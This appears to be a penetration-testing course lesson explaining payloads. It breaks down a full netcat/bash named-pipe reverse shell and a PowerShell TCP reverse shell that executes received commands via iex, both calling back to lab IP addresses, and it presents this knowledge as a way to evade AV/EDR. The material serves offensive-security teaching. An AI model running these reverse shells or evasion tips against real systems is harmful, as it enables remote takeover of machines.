
# Introduction to Payloads

In everyday communication, such as email or text messaging, the **payload** is the actual message being delivered. In computing and networking, the payload is the meaningful data carried inside a packet.

In **information security**, a **payload** is the **command or code that performs an action on a target system**, usually after a vulnerability has been exploited. From a defensive point of view, this action is considered malicious, which is why antivirus software attempts to detect and block payload execution.

A payload is not “magic” or mysterious. It is simply **instructions given to a computer**, just like any legitimate program. Understanding what a payload does internally is critical for:

* Customizing attacks
* Bypassing security controls
* Troubleshooting failed exploits
* Improving detection evasion

---

## Payloads and Security Controls

When a payload is executed:

* The operating system interprets the instructions
* Security tools (AV, EDR, AMSI) inspect behavior
* If the payload matches malicious patterns, execution is blocked

This is why Windows Defender blocked the PowerShell reverse shell earlier. It recognized the behavior, not because PowerShell itself is malicious, but because **the payload’s actions were**.

---

## Examining Payload One-Liners

Many payloads are copied and pasted without understanding how they work. Let’s break down two commonly used reverse shell payloads to remove that mystery.

---

# Netcat + Bash Reverse Shell (Linux)

### Full One-Liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

This payload serves an interactive Bash shell over a TCP connection.

---

### Step-by-Step Breakdown

#### 1. Remove Existing File

```bash
rm -f /tmp/f;
```

* Deletes `/tmp/f` if it exists
* `-f` prevents errors if the file is missing
* Semicolon allows the next command to run

---

#### 2. Create a Named Pipe

```bash
mkfifo /tmp/f;
```

* Creates a FIFO (named pipe)
* Enables bidirectional input/output between processes

---

#### 3. Read from the Pipe

```bash
cat /tmp/f |
```

* Reads input from the named pipe
* Sends it to the next command via a pipe (`|`)

---

#### 4. Launch Interactive Bash

```bash
/bin/bash -i 2>&1 |
```

* `-i` enables interactive mode
* `2>&1` redirects error output to standard output
* Output is piped forward

---

#### 5. Connect to Attacker Using Netcat

```bash
nc 10.10.14.12 7777 > /tmp/f
```

* Initiates a TCP connection to the attacker
* Redirects incoming data back into the named pipe
* Creates a feedback loop for command execution

---

### Result

* Commands sent by the attacker are executed by Bash
* Output is returned over the same TCP connection
* This is a fully interactive reverse shell

---

# PowerShell Reverse Shell (Windows)

### Full One-Liner

```powershell
powershell -nop -c "..."
```

This payload creates a PowerShell-based reverse shell using native Windows components.

---

## Step-by-Step Breakdown

### 1. Launch PowerShell Without Profile

```powershell
powershell -nop -c
```

* `-nop`: No profile (avoids detection and errors)
* `-c`: Executes the following command block
* Useful when executing from `cmd.exe`

---

### 2. Create a TCP Client

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

* Creates a TCP connection to the attacker
* Uses .NET networking libraries
* Outbound connection avoids firewall issues

---

### 3. Obtain the Network Stream

```powershell
$stream = $client.GetStream();
```

* Allows reading and writing data over the socket

---

### 4. Create a Byte Buffer

```powershell
[byte[]]$bytes = 0..65535 | %{0};
```

* Allocates memory for incoming commands
* Prepares the buffer for data transfer

---

### 5. Read Commands from Attacker

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

* Continuously listens for incoming commands
* Stops when the connection is closed

---

### 6. Convert Bytes to Text

```powershell
$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
```

* Converts raw bytes into readable commands

---

### 7. Execute Commands

```powershell
$sendback = (iex $data 2>&1 | Out-String);
```

* `iex` (Invoke-Expression) executes received commands
* Captures both output and errors

---

### 8. Format the Shell Prompt

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

* Displays current working directory
* Mimics a native PowerShell prompt

---

### 9. Send Output Back

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
```

* Sends command output back to attacker

---

### 10. Close Connection

```powershell
$client.Close()
```

* Terminates the TCP session cleanly

---

## Script-Based Payloads

One-liners can also be implemented as full scripts. A well-known example is:

* **Invoke-PowerShellTcp** from the **Nishang** framework

This script supports:

* Reverse shells
* Bind shells
* IPv4 and IPv6
* Structured error handling

Understanding one-liners makes large scripts much easier to analyze and modify.

---

## Why Payload Understanding Matters

Knowing what payloads do internally helps you:

* Modify payloads to evade AV/EDR
* Identify which component triggers detection
* Choose the correct payload for the target OS
* Debug broken shells during an engagement

---

## Key Takeaways

* A payload is simply executable instructions
* AV blocks behavior, not just tools
* Reverse shells rely on native OS features
* Understanding payload internals is critical for real-world success
* Payloads can be manual, scripted, or framework-generated

---

Next up, this knowledge will be applied to **automated payloads**, including **Metasploit**, where payload generation and delivery are handled for you—but understanding what’s happening under the hood remains essential.

